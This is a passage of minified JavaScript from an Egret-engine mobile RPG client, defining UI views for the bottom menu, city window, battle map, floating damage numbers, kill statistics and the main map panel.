__extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.battleBtn,this.onClick),this.addTouchEvent(this.BagBtn,this.onClick),this.addTouchEvent(this.roleBtn,this.onClick),this.addTouchEvent(this.playBtn,this.onClick),this.addTouchEvent(this.fuliBtn,this.onClick),this.addTouchEvent(this.shopBtn,this.onClick),this.hpBall=new n.MovieClip,this.hpBall.x=66,this.hpBall.y=46,this.mpBall=new n.MovieClip,this.mpBall.x=66,this.mpBall.y=46},e.prototype.addDisplay=function(){observe(this,this.updateHuShen,T.GameLogic.ins().postMpChange),observe(this,this.updateHuShen,T.GameLogic.ins().postCreateOtherEntity),observe(this,this.eat,T.GameLogic.ins().postEnterMap),observe(this,this.readyUpdateHp,Ts.entityHpChange),observe(this,this.readyUpdateHp,T.GameLogic.ins().postCreateOtherEntity),observe(this,this.updateBtnRp,l.RedPointBaseSys.ins().RpChange),observe(this,this.updateBtnRp,L.KfArenaRedPoint.ins().postRedPoint),observe(this,this.updateBtnRp,M.GuildSoulsRedPoint.ins().postRedPoint),observe(this,this.updateBtnRp,m.BagCT.ins().postItemAdd),observe(this,this.updateBtnRp,m.BagCT.ins().postItemDel),this.hpBall.playFile(RES_DIR_EFF+"HpEff1",-1),this.mpBall.playFile(RES_DIR_EFF+"MpEff1",-1),this.hPGroup.addChild(this.hpBall),this.hPGroup.addChild(this.mpBall),console.log("........ppp11,",this.mpBall.height,this.mpBall.width),console.log("........ppp22,",this.hPGroup.height,this.hPGroup.width);var t=a.EntityManager.ins().getEntityBymasterhHandle(u.ActorCC.handle);t&&(this.readyUpdateHp(t.infoModel),this.updateHuShen(t.infoModel)),this.updateBtnRp(),this.eat(),this.shopBtn.visible=!(null===urlParam||void 0===urlParam?void 0:urlParam.isHideAllShop)},e.prototype.getChuMoRp=function(){var t,e=c.Activity.ins().getActivityDataByType(f.ActivityDataType._42);if(!e||0==e.length)return!1;for(var i=0,n=e;i<n.length;i++){var o=n[i];if(null===(t=o.rp)||void 0===t?void 0:t.v)return!0}return!1},e.prototype.updateBtnRp=function(){var t,e;this.roleBtn.sRp=P.SkillCT.ins().rp.v||b.GodWeaponCC.ins().rp.v||W.ZsCT.ins().rp.v||(null===(t=d.TotemCT.ins().totemAllRed)||void 0===t?void 0:t.v)||H.DemonCirRedPoint.ins().redPoint||q.WarSoulCT.ins().rp.v||j.LongGasCT.ins().AllBagRed.v||K.GodCrownCT.ins().AllBagRed.v,this.BagBtn.sRp=m.BagCT.ins().redWearBag()||m.BagCT.ins().bagTjRed.v||m.BagCT.ins().bagAnimalsRed.v||v.Book.ins().allBookRed.v||B.ShenFuCT.ins().upRed.v||O.TaskCT.ins().titleTaskRed.v||S.Heirloom.ins().rp.v||m.BagCT.ins().callbackRed.v||m.BagCT.ins().XinShouLiBao.v||R.RuneRP.ins().runeMainRed.v||A.EquipCT.ins().animalsRp.v||A.EquipCT.ins().tjRp.v||N.WushuangRP.ins().returnWuShuangR(),this.fuliBtn.sRp=this.actRp()||y.DailyCheckIn.ins().rp.v||O.TaskCT.ins().jijinRed.v||O.TaskCT.ins().zhanlingRed.v||D.Recharge.ins().rpAct0_2.v||this.getChuMoRp()||V.FuLiCT.ins().funcShowRp.v,this.playBtn.sRp=O.TaskCT.ins().taskRp.v||O.TaskCT.ins().dayTaskRed.v||O.TaskCT.ins().weekTaskRed.v||I.GuildRP.ins().rp.v||F.PeakedSys.ins().rp.v||(null===(e=F.PeakedSys.ins().dzRp)||void 0===e?void 0:e.v)||_.GuildBattleCT.ins().enterRp.v||_.GuildBattleCT.ins().dailyRewardRp.v||_.GuildBattleCT.ins().rewardAllotRp.v||C.Fb2CT.ins().fb2Rp.v||L.KfArenaRedPoint.ins().redpoint>0||w.Guild.ins().returnNoGuildRep()||M.GuildSoulsRedPoint.ins().redPoint||Y.DominateWorldCT.ins().AllBagRed.v,this.shopBtn.sRp=this.setShopRP()},e.prototype.setShopRP=function(){if(1==g.Auction.ins().RPNumber)return!0;for(var t,e,i=E.Shop.ins().shopData,n=i.getShopEquipDataLength(),o=null,s=0;n>s;s++)o=i.getShopEquipDataByIndex(s),null!=o&&(1==o.costType?t+=o.costNum:e+=o.costNum);return!1},e.prototype.actRp=function(){var t,e,i=c.Activity.ins().activityData,n=Object.keys(i);if(!n.length)return!1;for(var o in i){var s=i[o];if(f.ActivityPageStyle.HAPPYSEVENDAY==s.pageStyle&&(null===(t=s.rp)||void 0===t?void 0:t.v))return!0;if(f.Activity3PageStyle.Activity2==s.pageStyle&&(null===(e=s.rp)||void 0===e?void 0:e.v))return!0}return!1},e.prototype.onClick=function(t){if(!p.GameMap.checkIsKf())switch(G.SoundUtil.play(G.SoundEnum.WINDOW),t.target){case this.battleBtn:win.open("ReformWin");break;case this.BagBtn:win.open("BagWin");break;case this.roleBtn:win.open("RoleWin");break;case this.playBtn:win.open("PlayWayWin");break;case this.fuliBtn:if(!x.OpenSystem.ins().checkSysOpen(h.SystemType.FULI))return;win.open("FuliWin");break;case this.shopBtn:if(!x.OpenSystem.ins().checkSysOpen(h.SystemType.MALL))return;win.open("ShopWin")}},e.prototype.readyUpdateHp=function(t){if(t)if(t instanceof r.EntityModel){if(!t.isMy||t.type==EntityType.Pet)return;this.updateHp(t)}else{var e=a.EntityManager.ins().getEntityByHandle(t.handle);if(!e||!e.infoModel||!e.infoModel.isMy||e.infoModel.type==EntityType.Pet)return;this.updateHp(e.infoModel)}},e.prototype.updateHp=function(t){var e=t?t.getAtt(s.AttributeType.atHp):1,i=t?t.getAtt(s.AttributeType.atMaxHp):1;this.hpBall.drawRect(Math.min(e,i)/i)},e.prototype.updateHuShen=function(t){if(t&&t.isMy&&t.type!=EntityType.Pet){var e=t.getAtt(s.AttributeType.atMp),i=t.getAtt(s.AttributeType.atMaxMp)||t.getAtt(s.AttributeType.atMp)||1;0==i?this.mpBall.drawRect(0):this.mpBall.drawRect(Math.min(e,i)/i)}},e.prototype.eat=function(){U.MainPotCC.eatEatEatTime()},__decorate([delayCall(500)],e.prototype,"updateBtnRp",null),__decorate([delayCall()],e.prototype,"updateHp",null),__decorate([delayCall(100)],e.prototype,"updateHuShen",null),__decorate([delayCall(100)],e.prototype,"eat",null),e}(o.BaseView);e.MainBot=Q,window.MainBot=Q,__reflect(Q.prototype,"MainBot",[]),window.MainBot=Q},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainCityWin=void 0;var n=i(1),o=i(0),s=i(20),a=i(143),r=i(448),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="mainCityWinSkin",e.showList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=r.MainCityItem,this.list.dataProvider=this.arc=new eui.ArrayCollection},e.prototype.addDisplay=function(){observe(this,this.updateText,Ts.enterScene.enterOK),observe(this,this.updateLock,Ts.enterScene.enterOK),observe(this,this.updateLock,a.RogueCT.ins().updateOpenData),this.list.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.list.addEventListener(eui.UIEvent.CHANGING,this.testItemeClick,this),this.list.addEventListener(eui.UIEvent.CHANGE,this.testItemeClick1,this),observe(this,this.updateList,Ts.enterScene.enterOK),this.updateText(),this.updateList(),this.MainCityLock.visible=!1,this.updateLock()},e.prototype.updateText=function(){var t,e;this.title.text=(null===(t=o.GlobalConfig.InstanceConfig[s.GameMap.fubenID])||void 0===t?void 0:t.name)||"",this.desc.text=(null===(e=o.GlobalConfig.InstanceConfig[s.GameMap.fubenID])||void 0===e?void 0:e.desc)||""},e.prototype.updateLock=function(){a.RogueCT.ins().isOpenRogue()&&(this.MainCityLock.visible=!0,this.MainCityLock.setAni())},e.prototype.updateList=function(){var t;this.showList=[];for(var e=o.GlobalConfig.InstanceConfig[s.GameMap.fubenID],i=(null===(t=null===e||void 0===e?void 0:e.cityImg)||void 0===t?void 0:t.length)||0,n=0;i>n;n++)this.showList.push({icon:e.cityImg[n],name:e.cityName[n],go:e.cityGo[n]});this.arc.replaceAll(this.showList)},e.prototype.onItemClick=function(t){var e=this.list.getElementAt(t.itemIndex);if(e.data.go){var i=e.data.go.split(",");if(void 0!=i.length){var n=null===i||void 0===i?void 0:i.length;3==n?win.open(i[0],i[1],i[2]):2==n?win.open(i[0],i[1]):win.open(i[0])}}},e.prototype.testItemeClick=function(t){},e.prototype.testItemeClick1=function(t){},e}(n.BaseView);e.MainCityWin=l,window.MainCityWin=l,__reflect(l.prototype,"MainCityWin",[]),window.MainCityWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainFightWin=void 0;var n=i(1),o=i(23),s=i(100),a=i(178),r=i(1067),l=i(37),h=i(16),u=i(137),p=i(53),d=i(13),c=i(0),f=i(95),g=i(20),m=i(32),v=i(57),y=i(47),C=i(7),T=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="mainfightskin",e._dropLayer=new egret.DisplayObjectContainer,e._dropNameLayer=new egret.DisplayObjectContainer,e._effBottomLayer=new egret.DisplayObjectContainer,e._effTopLayer=new egret.DisplayObjectContainer,e.moveArrow=new eui.Image,e.mouseX=0,e.mouseY=0,e.isMoveEd=!1,e.isMoveIng=!1,e._preClickTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.init=function(){e.pos=[];for(var t=0;t<s.mainfightcc.hNum;t++){for(var i=[],n=s.mainfightcc.gridH*(t+.5),a=0;a<s.mainfightcc.wNum;a++){var r=s.mainfightcc.gridW*(a+.5);i[t]={x:r,y:n}}e.pos[t]=i}observe(this,this.addEntity,o.GameLogic.ins().createEntityByModel),observe(this,this.addEntity2,o.GameLogic.ins().createEntity2),this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.addDisplay=function(){observe(this,this.onEnterScene,o.GameLogic.ins().postEnterMap),observe(this,this.onTarChange,p.ControlCC.setCurTar),observe(this,this.showCenter,o.GameLogic.ins().postShowCenter),observe(this,this.initCenter,o.GameLogic.ins().updateMy),observe(this,this.initCenter,y.KfArenaSys.ins().postShowMapCenter),this.observe(this.removeMapArrow,o.GameLogic.ins().postRemoveMapArrow),this._entityLayer=new eui.Group,this._entityLayer.sortableChildren=!0,this.moveArrow.source="main_xuanze",this.init(),this.eGrp.addChild(this._effBottomLayer),this.eGrp.addChild(this._entityLayer),this.eGrp.addChild(this._effTopLayer),this._bloodLayer=new r.BloodView,this.eGrp.addChild(this._bloodLayer),this.eGrp.addChild(this._dropLayer),this.eGrp.addChild(this._dropNameLayer);var t=l.EntityManager.ins().getAllEntity();for(var e in t)this.addEntity(t[e]);u.DropHelp.init(this._dropLayer,this._dropNameLayer),this._bloodLayer.touchEnabled=this._effTopLayer.touchEnabled=this._effBottomLayer.touchEnabled=this._dropNameLayer.touchEnabled=this._dropLayer.touchEnabled=!1,this.initSkillEff(),this.init2()},e.prototype.removeDisplay=function(){a.SkillEffPlayer.bottomLayer=null,a.SkillEffPlayer.topLayer=null,a.SkillEffPlayer.setTimeout=null,a.SkillEffPlayer.shake=null,u.DropHelp.dropContainer=null,u.DropHelp.dropNameContainer=null,this.clearAllLayer(),egret.Tween.removeTweens(this.moveArrow)},e.prototype.onEnterScene=function(){this.clearAllLayer(),this.init2(),this.isMoveEd=!1},e.prototype.init2=function(){var t=c.GlobalConfig.ScenesConfig[g.GameMap.mapID];this._entityLayer.width=((null===t||void 0===t?void 0:t.sizeX)||0)*s.mainfightcc.gridW,this._entityLayer.height=((null===t||void 0===t?void 0:t.sizeY)||0)*s.mainfightcc.gridH,this.eGrp.width=this._entityLayer.width,this.eGrp.height=this._entityLayer.height,this.fbmap.width=this._entityLayer.width,this.fbmap.height=this._entityLayer.height,t&&t.mapBg?(this.fbmap.visible=!0,this.fbmap.source=t.mapBg):this.fbmap.visible=!1,this.eGrp.x=this.eGrp.y=0,g.GameMap.fbType==m.FbCT.FB_KF||g.GameMap.fbType==m.FbCT.FB_TEAM||g.GameMap.fbType==m.FbCT.FB_TYPE_GUILD_WAR||g.GameMap.fbType==m.FbCT.FB_TYPE_KF_ARENA||1==(null===t||void 0===t?void 0:t.isDrag)||g.GameMap.fbType==m.FbCT.FB_TYPE_DEVILDOM_BOSS?(this.eGrp.addEventListener(egret.TouchEvent.TOUCH_BEGIN,this.onBegin,this),this.eGrp.addEventListener(egret.TouchEvent.TOUCH_MOVE,this.onMove,this)):(this.eGrp.removeEventListener(egret.TouchEvent.TOUCH_BEGIN,this.onBegin,this),this.eGrp.removeEventListener(egret.TouchEvent.TOUCH_MOVE,this.onMove,this)),this.scroller.viewport.scrollH=0,this.scroller.viewport.scrollV=0},e.prototype.clearAllLayer=function(){if(this._effBottomLayer&&this._effTopLayer&&this._bloodLayer&&this._entityLayer)for(this._effBottomLayer.removeChildren(),this._effTopLayer.removeChildren(),this._bloodLayer.removeChildren();this._entityLayer.numChildren;)this._entityLayer.removeChildAt(this._entityLayer.numChildren-1)},e.prototype.addEntity=function(t){var e,i,n;if(t){var o=(null===(i=c.GlobalConfig.MonstersConfig[null===(e=t.data)||void 0===e?void 0:e.configID])||void 0===i?void 0:i.type)==f.MonsterType.Boss,s=null===(n=t.data)||void 0===n?void 0:n.isMy,a=o?v.EntityOrder.BossOrder:s?v.EntityOrder.RoleOrder:v.EntityOrder.None;this._entityLayer.addChildAt(t,a)}},e.prototype.addEntity2=function(t){t&&this._dropLayer.addChild(t)},e.prototype.initSkillEff=function(){a.SkillEffPlayer.bottomLayer=this._effBottomLayer,a.SkillEffPlayer.topLayer=this._effTopLayer,a.SkillEffPlayer.setTimeout=function(t,e,i){Timer.start(t,1,e,i)},a.SkillEffPlayer.shake=function(t,e,i,n,o){o=o||1,t==l.EntityManager.ins().getMainRole(0)&&Math.random()<o}},e.prototype.onBegin=function(t){this.mouseX=Math.floor(t.stageX),this.mouseY=Math.floor(t.stageY),this.isMoveEd=!1,this.isMoveIng=!1},e.prototype.onMove=function(t){var e=t.stageX,i=t.stageY,n=this.grp.scrollH+.8*-Math.floor(e-this.mouseX),o=this.grp.scrollV+.8*-Math.floor(i-this.mouseY);this.grp.scrollH=Math.min(Math.max(n,0),this.eGrp.width-this.scroller.width),this.grp.scrollV=Math.min(Math.max(o,0),this.eGrp.height-this.scroller.height),this.mouseX=Math.floor(e),this.mouseY=Math.floor(i),this.isMoveEd=!0,this.isMoveIng=!0},e.prototype.onClick=function(t){var e,i,n,a;return __awaiter(this,void 0,void 0,function(){var r,l,h;return __generator(this,function(u){switch(u.label){case 0:return t.target==this._entityLayer||(null===(e=t.target.data)||void 0===e?void 0:e.configID)&&(null===(n=c.GlobalConfig.MonstersConfig[null===(i=t.target.data)||void 0===i?void 0:i.configID])||void 0===n?void 0:n.type)==f.MonsterType.MonsterType_Fire?(this.isMoveIng=!1,this.isMoveEd?[2]:(r=d.SubRoles.lookAtTar)?(p.ControlCC.isAuto&&(p.ControlCC.setAuto(!1),p.ControlCC.setCurTar(null)),l=this._entityLayer.globalToLocal(t.stageX,t.stageY),this.showArrow(s.mainfightcc.gridToPox(s.mainfightcc.poxToGrid(l))),h=p.ControlCC.getMoveCd(),C.GameServerCC.serverTime-this._preClickTime<h?(console.error("movecd111手速过快",C.GameServerCC.serverTime-this._preClickTime),[2]):(this._preClickTime=C.GameServerCC.serverTime,o.GameLogic.ins().find3v3Question("点击地板请求移动111111"),[4,p.ControlCC.pushCommand(p.CommandEnum.move,{gridX:s.mainfightcc.xToGrid(l.x),gridY:s.mainfightcc.yToGrid(l.y),checkFun:function(){return d.SubRoles.lookAtTar?p.ControlCC.getDis(d.SubRoles.lookAtTar.data,{gridX:s.mainfightcc.xToGrid(l.x),gridY:s.mainfightcc.yToGrid(l.y)})<=0:!0}})])):[2]):[3,2];case 1:if(u.sent(),g.GameMap.fbType!=m.FbCT.FB_TYPE_CITY){if(g.GameMap.checkIsInShiKongZhiJing()&&0==(null===(a=c.GlobalConfig.InstanceConfig[g.GameMap.fubenID])||void 0===a?void 0:a.camp))return[2];p.ControlCC.setAuto(!0)}u.label=2;case 2:return[2]}})})},e.prototype.initCenter=function(t){this.showCenter(t)},e.prototype.showCenter=function(t){var e=c.GlobalConfig.ScenesConfig[g.GameMap.mapID];if(1==(null===e||void 0===e?void 0:e.posBtn)||g.GameMap.fbType==m.FbCT.FB_KF||g.GameMap.fbType==m.FbCT.FB_TYPE_DEVILDOM_BOSS||g.GameMap.fbType==m.FbCT.FB_TEAM||g.GameMap.fbType==m.FbCT.FB_TYPE_GUILD_WAR||g.GameMap.fbType==m.FbCT.FB_TYPE_KF_ARENA){var i,n;t?(i=t.x-.5*this.grp.width+.5*s.mainfightcc.gridW,n=t.y-.5*this.grp.height+.5*s.mainfightcc.gridH):(i=d.SubRoles.lookAtTar.x-.5*this.grp.width+.5*s.mainfightcc.gridW,n=d.SubRoles.lookAtTar.y-.5*this.grp.height+.5*s.mainfightcc.gridH),egret.Tween.removeTweens(this.scroller.viewport),egret.Tween.get(this.scroller.viewport).to({scrollH:Math.min(Math.max(i,0),this.eGrp.width-this.scroller.width),scrollV:Math.min(Math.max(n,0),this.eGrp.height-this.scroller.height)},200)}},e.prototype.showArrow=function(t){this._entityLayer.addChildAt(this.moveArrow,0),this.moveArrow.x=t.x-.5*this.moveArrow.width+.5*s.mainfightcc.gridW;var e=this.moveArrow.y=t.y-this.moveArrow.height+.5*s.mainfightcc.gridH;egret.Tween.removeTweens(this.moveArrow);var i=egret.Tween.get(this.moveArrow,{loop:!0});i.to({y:e-20},500).to({y:e},500)},e.prototype.onTarChange=function(){p.ControlCC.curTar&&this.removeMapArrow()},e.prototype.removeMapArrow=function(){egret.Tween.removeTweens(this.moveArrow),h.DisplayUtils.removeFromParent(this.moveArrow)},__decorate([delayCall(500)],e.prototype,"initCenter",null),e}(n.BaseView);e.MainFightWin=T,window.MainFightWin=T,__reflect(T.prototype,"MainFightWin",[]),window.MainFightWin=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BloodView=void 0;var n=i(1068),o=i(23),s=i(1),a=i(7),r=i(86),l=i(0),h=i(37),u=i(53),p=i(70),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.curTime=0,e}return __extends(e,t),e.prototype.addDisplay=function(){this.touchEnabled=!1,this.touchChildren=!1,observe(this,this.show,o.GameLogic.ins().postEntityHpChange),observe(this,this.showFont,r.SkillCT.ins().postFont)},e.prototype.show=function(t){var e=t[0],i=t[1],n=t[2],o=t[3],s=t[4];u.ControlCC.isHideBloodEff||(a.GameServerCC.serverTime-this.curTime<=500?(Timer.start(500,1,this.showBlood,this,[e,i,n,o,s]),this.curTime=0):this.showBlood([e,i,n,o,s]))},e.prototype.showBlood=function(t){var e=t[0],i=t[1],o=t[2],s=t[3],a=t[4];return __awaiter(this,void 0,void 0,function(){var t,r=this;return __generator(this,function(l){return e?(t=new eui.Component,t.skinComplete=function(){var l;i&&h.EntityManager.ins().isPet(null===(l=i.infoModel)||void 0===l?void 0:l.handle)&&0>s?o&n.DamageTypes.Dodge?t.currentState=n.DamageTypes.Dodge+"":t.currentState="pet":r.getBuffCfgBloodType(a)?t.currentState=r.getBuffCfgBloodType(a):o&n.DamageTypes.Lucky2?t.currentState=n.DamageTypes.Lucky2+"":o&n.DamageTypes.Dodge?t.currentState=n.DamageTypes.Dodge+"":o&n.DamageTypes.ZhiMing?t.currentState=n.DamageTypes.ZhiMing+"":o&n.DamageTypes.CRIT?t.currentState=n.DamageTypes.CRIT+"":o&n.DamageTypes.HitType_WarSoulHit?t.currentState="ws":o&n.DamageTypes.HitType_WarSoulLucky?t.currentState="wsc":o&n.DamageTypes.Fujia?t.currentState=n.DamageTypes.Fujia+"":t.currentState=o+"";var u;if(u=i?i.x<e.x?1:-1:1,t.dam=Math.abs(s),t.fh=0>s?"-":s>0?"+":"",t.validateNow(),t.x=e.x+(e.entityOffX?e.entityOffX():0)-t.width/2,t.y=e.y+(e.entityOffY?e.entityOffY():0)-t.height/2,o&n.DamageTypes.CRIT){var p=ObjectPool.pop("MovieClip");p.x=e.x+60,p.y=e.y+60,p.playFile(RES_DIR_EFF+"baojitexiao"),r.addChild(p)}else if(o&n.DamageTypes.ZhiMing){var p=ObjectPool.pop("MovieClip");p.x=e.x+60,p.y=e.y+60,p.playFile(RES_DIR_EFF+"zhimingtexiao"),r.addChild(p)}var d=r.flyBlood(t,u);d.call(function(){removeFromParent(t)})},t._sn_="dambloodskin",this.addChild(t),[2]):[2]})})},e.prototype.flyBlood=function(t,e){void 0===e&&(e=1),t.scaleX=2,t.scaleY=2;var i=p.MathUtils.random(15,35),n=p.MathUtils.random(0,20);return egret.Tween.get(t).to({scaleX:1,scaleY:1,x:t.x+i*e,y:t.y-n},180,egret.Ease.getElasticOut(1.5,.5)).to({x:t.x+(i+50)*e,y:t.y-(n+90),alpha:.8},700)},e.prototype.showFont=function(t){var e=t[0],i=t[1];if(e&&!u.ControlCC.isHideBloodEff){var n=l.GlobalConfig.SkillsDescConfig[l.GlobalConfig.SkillsConfig[i].desc];if(n){var o=new eui.Image,s=n.icon||"",a=e;if(r.SkillCT.ins().hasSuitSkillEff(i,a)){var h=l.GlobalConfig.GemReviseSkillConfig[Math.floor(i/1e3)];h.icon&&(s=h.icon)}o.source=s,o.alpha=1,o.x=e.x+(e.entityOffX?e.entityOffX():0)-69.5,o.y=e.y+(e.entityOffY?e.entityOffY():0)-69.5,this.addChild(o),egret.Tween.get(o).to({y:o.y-40,alpha:.8},600).to({y:o.y-50,alpha:0},50).call(function(){o.parent&&o.parent.removeChild(o)})}}},e.prototype.getBuffCfgBloodType=function(t){var e;return null===(e=l.GlobalConfig.EffectsConfig[t])||void 0===e?void 0:e.bloodType},e}(s.BaseView);e.BloodView=d,window.BloodView=d,__reflect(d.prototype,"BloodView",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DamageTypes=void 0;var n;!function(t){t[t.BLANK=0]="BLANK",t[t.HIT=1]="HIT",t[t.CRIT=2]="CRIT",t[t.Dodge=4]="Dodge",t[t.Lucky=8]="Lucky",t[t.AddHp=16]="AddHp",t[t.Fujia=32]="Fujia",t[t.Deter=64]="Deter",t[t.Lianji=128]="Lianji",t[t.ZhuiMing=256]="ZhuiMing",t[t.ZhiMing=512]="ZhiMing",t[t.Lucky2=1024]="Lucky2",t[t.LianJiCRIT=2048]="LianJiCRIT",t[t.HejiCRIT=4096]="HejiCRIT",t[t.True=8192]="True",t[t.HitType_WarSoulLucky=16384]="HitType_WarSoulLucky",t[t.HitType_WarSoulHit=32768]="HitType_WarSoulHit"}(n=e.DamageTypes||(e.DamageTypes={})),window.DamageTypes=n},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainInfoKoWin=void 0;var n=i(1),o=i(0),s=i(4),a=i(20),r=i(31),l=i(43),h=i(23),u=i(64),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="mainInfoKoSkin",e.strName=[gettext("普通"),gettext("精英"),gettext("头目"),gettext("统领"),gettext("领主")],e}return __extends(e,t),e.prototype.addDisplay=function(){observe(this,this.updateEntity,h.GameLogic.ins().postDie),observe(this,this.updateEquip,l.CityCC.ins().postMapDrop),this.addTouchEvent(this.btn,this.onClick),this.leftInfo.text="",this.rightInfo.text="",this.updateEntity(),this.updateEquip(),this.showMap()},e.prototype.updateEntity=function(){var t,e="";e+=gettext("<a color = 0xFFFFFF>获得经验统计:</a>{0}\n",s.ActorCC.allExp||0);for(var i=u.MainUICC.getMapInfoCensusEntity(),n=0;5>n;n++)e+=gettext("<a color = {0}>击杀{1}怪物:</a>{2}\n",r.QUALITY_COLOR[n],this.strName[n]||"",i?(null===(t=i[n])||void 0===t?void 0:t.count)||0:0);this.leftInfo.textFlow=(new egret.HtmlTextParser).parse(e)},e.prototype.updateEquip=function(){var t="",e=u.MainUICC.getMapInfoCensusEquip();t+=gettext("<a color = 0xFFFFFF>获得金币统计:</a>{0}\n",e?e[-1]||0:0);for(var i=0;5>i;i++)t+=gettext("<a color = {0}>{1}装备掉落:</a>{2}\n",r.QUALITY_COLOR[i],r.QUALITY_NAME[i],e?e[i]||0:0);this.rightInfo.textFlow=(new egret.HtmlTextParser).parse(t)},e.prototype.showMap=function(){var t=o.GlobalConfig.InstanceConfig[a.GameMap.fubenID];this.str.text=""!=t.entityInfo?t.entityInfo:gettext("无"),this.str1.text=""!=t.equipInfo?t.equipInfo:gettext("无")},e.prototype.onClick=function(){win.close(this)},e}(n.BaseView);e.MainInfoKoWin=p,window.MainInfoKoWin=p,__reflect(p.prototype,"MainInfoKoWin",[]),window.MainInfoKoWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainMap=void 0;var n=i(21),o=i(18),s=i(5),a=i(1),r=i(17),l=i(0),h=i(15),u=i(20),p=i(1072),d=i(43),c=i(32),f=i(93),g=i(23),m=i(51),v=i(196),y=i(12),C=i(25),T=i(456),b=i(79),w=i(169),I=i(2),_=i(64),S=i(67),x=i(457),D=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e.mainView=!0,e._sn_="mainMapSkin",e._guildBtCfgs=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.SixTrasGrop0.visible=!1,this.SixTrasGrop.visible=!1,this.addTouchEvent(this.mailBtn,this.onClick),this.addTouchEvent(this.chatBtn,this.onClick),this.addTouchEvent(this.chatBtn0,this.onClick),this.addTouchEvent(this.guaBtn,this.onClick),this.addTouchEvent(this.cbBtn,this.onClick),this.addTouchEvent(this.zzBtn,this.onClick),this.addTouchEvent(this.infoBtn,this.onClick),this.addTouchEvent(this.setBtn,this.onClick),this.addTouchEvent(this.mapImg,this.onClick),this.addTouchEvent(this.notClick,this.onClick),this.addTouchEvent(this.btn_BianQiang,this.onClick),this.addTouchEvent(this.btn_GongLue,this.onClick),this.addTouchEvent(this.SixTrasGrop0,this.onClick),this.addTouchEvent(this.useTF,this.onClick),this.btn_GongLue.visible=!platform.isshen()},e.prototype.addDisplay=function(){p.HBSystem.ins().setHongBaoContainer(this.hongbao),p.HBSystem.ins().updateHongBao(),observe(this,this.updateMap,g.GameLogic.ins().postEnterMap),observe(this,this.mainMapChange,_.MainUICC.onClickMap),observe(this,this.redRefresh,r.RedPointBaseSys.ins().RpChange),observe(this,this.guajiMc,C.Recharge.ins().postAutoPrivilege),observe(this,this.redRefresh,f.Friends.ins().postFriendChange),observe(this,this.zzMc,C.Recharge.ins().postGodWar),observe(this,this.cbMc,C.Recharge.ins().postRecycle),observe(this,this.updateTeamBtnRp,d.CityCC.ins().postChangeApplyList,d.CityCC.ins().doPostTeamPlayerInfo),observe(this,this.setSelectSixTools,b.SixReisCT.ins().psetPlayerBaseInfo),observe(this,_.MainUICC.setMapInfoEntityDic,g.GameLogic.ins().postDie),observe(this,_.MainUICC.setMapInfoEquipDic,d.CityCC.ins().postMapDrop),this.observe(m.GuildBattleCT.ins().postPointUpdate,this.updateGuildBtTaskInfo),this.observe(b.SixReisCT.ins().updateMap,this.SixData),this.mainMapBoss.visible=!1,this.updateMap(),C.Recharge.ins().rpGodOfWar.bind(this.zzRed),C.Recharge.ins().rpRecycle.bind(this.cbRed),this.redRefresh(),this.guajiMc(),this.zzMc(),this.cbMc(),this.changeBtn(),this.mainMapChange()},e.prototype.onClick=function(t){switch(t.target){case this.mailBtn:if(u.GameMap.checkIsKf())return;win.open("MailWin");break;case this.chatBtn:win.open("ChatWin");break;case this.btn_ZuDui:if(u.GameMap.checkIsKf())return;win.open("TeamCityListWin");break;case this.chatBtn0:win.open("PrivateChatWin");break;case this.guaBtn:if(u.GameMap.checkIsKf())return;w.RexueDideCT.ins().isOpenAutoFight?win.open("AutoFightInfoWin"):win.open("AutoFightWin");break;case this.cbBtn:if(u.GameMap.checkIsKf())return;win.open("PrivilegeTipWin",0);break;case this.zzBtn:if(u.GameMap.checkIsKf())return;win.open("PrivilegeTipWin",1);break;case this.infoBtn:win.open("CastingMainWin");break;case this.setBtn:win.open("SettingView");break;case this.mapImg:if(u.GameMap.fbType==c.FbCT.FB_TYPE_LIU_DAO_LUN_HUI)return void win.open(T.SixreincarnationsMapWin);if(!y.OpenSystem.ins().checkSysOpen(h.SystemType.WORLDMAP))return;win.open("RankingWin");break;case this.notClick:I.TipsCT.ins().showTips(gettext("跨服状态下无法使用"));break;case this.btn_GongLue:if(u.GameMap.checkIsKf())return;win.open(x.View_GongLue);break;case this.btn_BianQiang:win.open(S.View_BianQiang);break;case this.SixTrasGrop0:win.open(T.SixreincarnationsMapWin);break;case this.useTF:b.SixReisCT.ins().setTakeTools()}},e.prototype.updateTeamBtnRp=function(){},e.prototype.setSelectSixTools=function(){this.sixBuff||(this.sixBuff=new n.MovieClip,this.effGrop.addChild(this.sixBuff),this.sixBuff.playFile(RES_DIR_EFF+"ValueEff2",-1),this.effGrop.scaleX=this.effGrop.scaleY=.35,this.sixBuff.x=-41),this.sixBuff.visible=0==b.SixReisCT.ins().isCostTools?!0:!1,this.useTF.selected=1==b.SixReisCT.ins().isCostTools?!0:!1},e.prototype.mainMapChange=function(t){void 0===t&&(t=!1),this.mainMapBoss.visible=_.MainUICC.mainBossShow},e.prototype.updateGuildBtTaskInfo=function(){if(!this._guildBtCfgs||0==this._guildBtCfgs.length){var t=l.GlobalConfig.GuildBattlePersonalAward;for(var e in t)this._guildBtCfgs.push(t[e])}var i=this._guildBtCfgs.length-1,n=0;for(this._guildBtCfgs.length;n<this._guildBtCfgs.length;n++){var o=this._guildBtCfgs[n];if(m.GuildBattleCT.ins().getModel().ownPoint<o.integral){i=n;break}}var 